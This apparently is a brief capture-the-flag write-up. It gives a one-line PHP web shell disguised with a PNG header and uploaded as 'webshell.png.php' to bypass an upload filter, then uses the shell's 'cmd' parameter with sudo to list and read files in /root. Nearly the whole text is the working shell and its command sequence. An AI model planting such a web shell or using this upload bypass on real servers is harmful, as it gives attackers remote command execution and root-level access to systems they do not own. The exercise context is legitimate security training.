Upload a *webshell.png.php*:

```php
PNG
<?php echo system($_GET['cmd']); ?>
```

The webshell can be accessed at `/uploads/webshell.png.php`

`?cmd=ls /root/` doesn't give anything \
`?cmd=sudo ls /root/` lists the files in /root, which includes a flag.txt \
`?cmd=sudo cat /root/flag.txt` prints the flag
